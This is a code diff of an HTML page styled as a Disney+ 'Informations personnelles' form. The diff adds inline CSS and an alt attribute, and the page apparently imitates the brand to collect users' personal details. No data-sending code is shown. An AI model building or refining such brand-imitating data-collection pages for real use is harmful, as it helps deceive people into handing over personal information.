@@ -5,9 +5,84 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Infos Personnelles | Disney+</title>
   <link rel="stylesheet" href="style.css" />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-image: url('Images/compose.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      min-height: 100vh;
+      color: white;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      padding: 20px 40px;
+    }
+
+    .logo {
+      width: 120px;
+    }
+
+    .form-container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-size: 2.5rem;
+      text-align: center;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 10px 20px;
+      border-radius: 8px;
+    }
+
+    form {
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 30px;
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    input {
+      padding: 12px;
+      border-radius: 5px;
+      border: none;
+      font-size: 1rem;
+    }
+
+    button {
+      background-color: #0063e5;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      font-size: 1rem;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0483ee;
+    }
+  </style>
 </head>
 <body>
-  <header><img src="Images/logo-disney.png" class="logo" /></header>
+  <header>
+    <img src="Images/logo-disney.png" class="logo" alt="Disney+" />
+  </header>
+
   <main class="form-container">
     <h1>Informations personnelles</h1>
     <form id="infoForm">
@@ -19,6 +94,7 @@
       <button type="submit">Continuer</button>
     </form>
   </main>
+
   <script>
     document.getElementById('infoForm').addEventListener('submit', function(e) {
       e.preventDefault();
